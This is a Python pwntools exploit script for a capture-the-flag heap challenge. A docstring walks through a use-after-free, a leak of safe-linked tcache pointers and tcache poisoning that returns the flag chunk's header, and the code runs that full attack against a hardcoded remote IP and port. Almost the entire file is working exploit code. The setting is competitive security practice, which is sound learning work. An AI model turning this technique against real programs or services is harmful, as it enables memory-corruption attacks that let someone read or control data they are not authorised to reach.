#!/usr/bin/env python3
"""
Grimoire Heap - CTF exploit v3 (full flag, single shot)

Bug: banish() frees but never clears spells[i]/sizes[i]  ->  UAF.
Goal: g_flag (malloc(0x80) at startup) holds the flag, in the heap chunk
      immediately before the first spell chunk. Fixed heap layout:
          [tcache_perthread_struct 0x290]
          [g_flag chunk 0x90 : hdr @ heap+0x290, user @ heap+0x2a0]  <- flag
          [spell0      0x90 :                user @ heap+0x330]     <- C0
          [spell1      0x90 :                user @ heap+0x3c0]     <- C1
      so   g_flag_hdr  = C0 - 0xa0   (16-byte aligned, size field = 0x91)
           g_flag_user = C0 - 0x90

Glibc 2.34+ tcache_get zeroes `e->key` (chunk user+8) of the RETURNED chunk.
If we return g_flag_user directly, that zeroes g_flag[8..16] -> 8 flag bytes lost.
Trick: return g_flag *chunk header* (g_flag_user - 0x10) instead.
  - aligned_OK passes (16-aligned).
  - any size-header check passes (size field there is the legit 0x91).
  - tcache_get zeroes header+8 == the chunk's SIZE FIELD (metadata), NOT the flag.
  - recite() writes spells[i] for sizes[i]=0x80 bytes starting at the chunk header,
    so the flag (at user data = read offset 0x10) is returned fully intact & contiguous.

Plan (two distinct chunks -> count==2, no double-free):
  1. create(0,0x80) -> C0          (from top)
  2. create(1,0x80) -> C1 = C0+0x90 (tcache empty -> both from top, consecutive)
  3. banish(0)  -> count=1, head=C0, C0->fd = (C0>>12) ^ 0      = page
  4. banish(1)  -> count=2, head=C1, C1->fd = (C1>>12) ^ C0    = page ^ C0
  5. recite(0) -> fd0 = page
     recite(1) -> fd1 = page ^ C0  ->  C0 = fd0 ^ fd1  (verify C0&0xfff==0x330)
  6. target  = C0 - 0xa0                       # g_flag chunk header
     protect = page ^ target                   # write into C1->fd  (pos=C1, pos>>12=page)
  7. edit(1) -> p64(protect) padded to sizes[1]=0x80
  8. create(0,0x80,"X\\n") -> pop C1 (head); new head = target; count=1
  9. create(2,0x80,"\\n")   -> pop target (=g_flag hdr); newline-only keeps flag intact; count=0
 10. recite(2,0x80) -> bytes [hdr(16) | flag(...)]. Flag starts at output offset 0x10.
"""
from pwn import *
import sys, re

context.clear(arch='amd64')
context.log_level = 'warn'

HOST, PORT = '52.76.96.108', 9005
SZ = 0x80
FLAG_HDR_OFF = 0x10   # flag user data sits this many bytes into the chunk-header read

def conn():
    return remote(HOST, PORT)

def menu(p):       p.recvuntil(b'> ')
def create(p, idx, size, data):
    p.sendline(b'1');              p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); p.recvuntil(b'size: ')
    p.sendline(str(size).encode()); p.recvuntil(b'data: ')
    if isinstance(data, str): data = data.encode()
    p.send(data)
def edit(p, idx, data):
    p.sendline(b'2');              p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); p.recvuntil(b'data: ')
    assert len(data) == SZ
    p.send(data)
def banish(p, idx):
    p.sendline(b'3');              p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
def recite(p, idx, size):
    p.sendline(b'4');              p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); p.recvuntil(b'data: ')
    data = p.recvn(size)
    try: p.recv(1, timeout=1)
    except: pass
    return data

def run():
    p = conn()
    menu(p)

    create(p, 0, SZ, b'A'*(SZ-1)+b'\n')      # C0
    create(p, 1, SZ, b'B'*(SZ-1)+b'\n')      # C1 = C0+0x90
    banish(p, 0)
    banish(p, 1)

    fd0 = u64(recite(p, 0, SZ)[0:8])          # page
    fd1 = u64(recite(p, 1, SZ)[0:8])          # page ^ C0
    page = fd0
    C0   = fd0 ^ fd1
    log.warn(f"page = {hex(page)}  C0 = {hex(C0)}  (C0&0xfff={hex(C0 & 0xfff)})")
    assert (C0 & 0xfff) == 0x330, "heap layout assumption broken"

    target  = C0 - 0xa0                        # g_flag chunk header (& 0xfff == 0x290)
    protect = page ^ target                    # PROTECT(pos=C1, ptr=target); C1>>12 == page
    log.warn(f"target(g_flag hdr) = {hex(target)}  protect = {hex(protect)}")
    assert (target & 0xf) == 0, "target not 16-aligned"

    edit(p, 1, p64(protect) + b'\x00'*(SZ-8))  # poison C1->fd

    create(p, 0, SZ, b'X\n')                   # pop C1 -> head=target, count=1
    create(p, 2, SZ, b'\n')                    # pop target (g_flag hdr); keep flag intact, count=0

    data = recite(p, 2, SZ)                    # 0x80 bytes from the chunk header
    print("\n=== recite(2) raw (hex) ===")
    print(data.hex())
    print("\n=== recite(2) ascii (offset-annotated) ===")
    for i in range(0, len(data), 8):
        chunk = data[i:i+8]
        print(f"  +{i:#04x}: {chunk.hex()}  {chunk!r}")

    # flag begins at chunk-user offset 0x10 inside this read
    body = data[FLAG_HDR_OFF:]
    flag = body.split(b'\x00', 1)[0]
    print("\n=== FLAG (bytes) ===")
    print(flag)
    print("\n=== FLAG (text) ===")
    print(flag.decode(errors='replace'))

    m = re.search(rb'[ -~]+', data)
    if m: print("printable:", m.group(0))
    try:
        p.sendline(b'0'); p.recvall(timeout=2)
    except: pass
    p.close()
    return flag

if __name__ == '__main__':
    flag = run()
    print("\n\n==================")
    print("FLAG:", flag.decode(errors='replace'))
    print("==================")